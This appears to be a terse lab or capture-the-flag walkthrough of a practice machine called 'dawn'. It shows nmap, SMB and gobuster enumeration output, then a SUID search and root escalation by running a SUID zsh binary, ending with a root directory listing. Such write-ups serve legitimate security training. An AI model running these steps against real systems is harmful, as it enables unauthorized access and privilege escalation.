# NMAP
```
PORT     STATE SERVICE     REASON         VERSION
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       syn-ack ttl 63 MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 15
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, Support41Auth, InteractiveClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, Speaks41ProtocolOld, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: LS<o>(Iw?p:l3V8V']~%
|_  Auth Plugin Name: mysql_native_password
```

# SMB
```
smbclient -L 192.168.65.11                        
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            
```

# Gobuster
```
gobuster dir -u http://192.168.111.11/ -w /opt/wordlists/dirb/big.txt -x php,html,txt -t 30
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.111.11/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /opt/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2021/11/30 14:52:19 Starting gobuster in directory enumeration mode
===============================================================
/cctv                 (Status: 301) [Size: 315] [--> http://192.168.111.11/cctv/]
/index.html           (Status: 200) [Size: 791]                                  
/logs                 (Status: 301) [Size: 315] [--> http://192.168.111.11/logs/]
/server-status        (Status: 403) [Size: 302]                                  
                                                                                 
===============================================================
2021/11/30 15:01:30 Finished
===============================================================
```

## local.txt
Local.txt was found on /home/dawn
```
dawn@dawn:~$ ls -la    
ls -la
total 40
drwxr-xr-x 5 dawn dawn 4096 Jul 22  2020 .
drwxr-xr-x 4 root root 4096 Aug  2  2019 ..
-rw------- 1 dawn dawn    0 Mar 16  2020 .bash_history
-rw-r--r-- 1 dawn dawn  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 dawn dawn 3526 Jul 31  2019 .bashrc
drwx------ 3 dawn dawn 4096 Aug  1  2019 .gnupg
drwsrwsrwx 2 dawn dawn 4096 Nov 30 02:11 ITDEPT
drwxr-xr-x 3 dawn dawn 4096 Aug  1  2019 .local
-rw-r--r-- 1 dawn dawn   33 Nov 30 01:52 local.txt
-rw------- 1 dawn dawn    0 Mar 16  2020 .mysql_history
-rw-r--r-- 1 dawn dawn  807 Jul 31  2019 .profile
-rw-r--r-- 1 dawn dawn   66 Aug  1  2019 .selected_editor
```

# root
```
dawn@dawn:~$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/mount.cifs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/zsh
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
dawn@dawn:~$ cd /usr/bin
.cd /usr/bin
dawn@dawn:/usr/bin$./zsh
./zsh
dawn# id                                                                       
id
uid=1000(dawn) gid=1000(dawn) euid=0(root) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
dawn# ls -la /root                                                             
ls -la /root
total 44
drwx------  6 root root 4096 Nov 30 01:52 .
drwxr-xr-x 18 root root 4096 Mar 16  2020 ..
-rw-------  1 root root    0 Aug 12  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Jul 31  2019 .config
-rw-r--r--  1 root root   32 Jul 14  2020 flag.txt
drwx------  3 root root 4096 Aug  1  2019 .gnupg
drwxr-xr-x  3 root root 4096 Jul 31  2019 .local
-rw-------  1 root root    0 Aug  1  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Nov 30 01:52 proof.txt
-rw-r--r--  1 root root   66 Aug  1  2019 .selected_editor
drwxr-xr-x  4 root root 4096 Jul 31  2019 .wine
```
